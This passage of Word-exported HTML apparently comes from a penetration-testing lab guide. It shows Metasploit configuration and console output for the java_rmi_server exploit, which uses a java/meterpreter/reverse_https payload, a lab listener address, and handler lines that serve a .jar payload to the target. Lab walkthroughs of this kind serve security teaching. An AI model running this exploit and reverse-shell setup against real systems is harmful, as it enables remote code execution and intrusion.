0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local host to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >on.</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >This must be an address on</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >the</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >local machine or 0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >8080</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local port to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >on.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:51.3500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLCert</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Path to a custom</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSL certificate</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:288.6000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(default is randomly</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generated)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:29.7500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >URIPATH</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The URI to use for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >this exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:57.5500pt;margin-left:8.0000pt;text-indent:280.6000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >(default is random) Payload options (java/meterpreter/reverse_https):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:443.8500pt;margin-left:32.8500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Name</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Current Setting</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Required</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=339  valign=top  style="width:203.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Description</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=339  valign=top  style="width:203.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >LHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.106</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=339  valign=top  style="width:203.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local listener hostname</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >LPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >4444</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=339  valign=top  style="width:203.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local listener port</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:367.9500pt;margin-left:29.5500pt;text-indent:-21.6000pt;text-align:left;line-height:27.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >target: Id</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >----</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Generic (Java</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Payload)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section267" ><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Started HTTPS reverse handler on https://0.0.0.0:4444/ [*] Using URL: http://0.0.0.0:8080/HyoL5LuwMTqNTAp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:90.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Local IP: http://127.0.0.1:8080/HyoL5LuwMTqNTAp [*] Connected and sending request for http://192.168.56.106:8080/HyoL5LuwMTqNTAp/xlLv.jar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:36.9500pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*]</span><span style="mso-spacerun:'yes';font-family:'Courier 